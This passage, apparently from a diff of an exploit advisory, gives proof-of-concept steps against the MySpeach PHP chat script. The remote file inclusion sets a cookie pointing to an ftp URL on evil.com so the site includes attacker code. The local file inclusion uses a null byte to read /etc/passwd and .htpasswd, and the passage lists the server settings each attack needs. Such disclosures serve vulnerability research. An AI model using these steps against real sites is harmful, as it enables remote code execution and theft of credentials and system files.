@@ -1,0 +1,34 @@
+  +---->> Vuln. #1 Pro0f of Concept <<--------//
+  |
+  | - Create a cookie : 	| Name  : my_ms[root]
+  |				| Value : ftp://user:password@evil.com
+  |				| Host  : www.victim.com
+  | - Create a file called 'config.php' in a folder called 'admin' to obtain a path like that : evil.com/admin/config.php
+  | - Then, go on the page : www.victim.com/[myspeach_install_directory(default: myspeach)]/chat.php
+  |   * If you get the following error message : "MySpeach n est pas encore installé, the vulnerability cannot be
+  |     exploited, probably because the version of PHP is under 5.0.0 and/or register_globals = Off and/or 
+  |     allow_url_fopen = Off.
+  |   * Else, the RFI will work and, in the same time, a lot of inclusion errors will appears because the script try
+  |     to include another files like 'admin/options.php', 'admin/setup.php' ... (but the RFI must be done with 'config.php'
+  |     because if file_exists($my_ms['root']) return false, the function exit() will be called ...).
+  |     Particularly, it sparks a Full Path Disclosure :
+  |
+  [     Fatal error: Call to undefined function my_MS_plus_un() in /full/path/myspeach/chat.php on line [line]
+  |
+  +-------------------------------------------
+
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+ <2> VULNERABILITY #2 : LOCAL FILE INCLUSION (WITH FULLPATHDISCL)
+
+  { Cond: only register_globals=On }
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+  It is also possible to include a local file by using the Null Byte char \x0 (urlencoded: %00). It will also spark a FullPathDiscl.
+
+  +---->> Vuln. #2 Pro0f of Concept <<--------
+  |
+  | - See the Vuln#1 PoC, but change the value of the cookie created, by the path of a local file ended with %00.
+  | Example : /etc/passwd%00; ../admin-panel/.htpasswd%00 ... and it will work if register_globals=On
+  |
+  +-------------------------------------------//
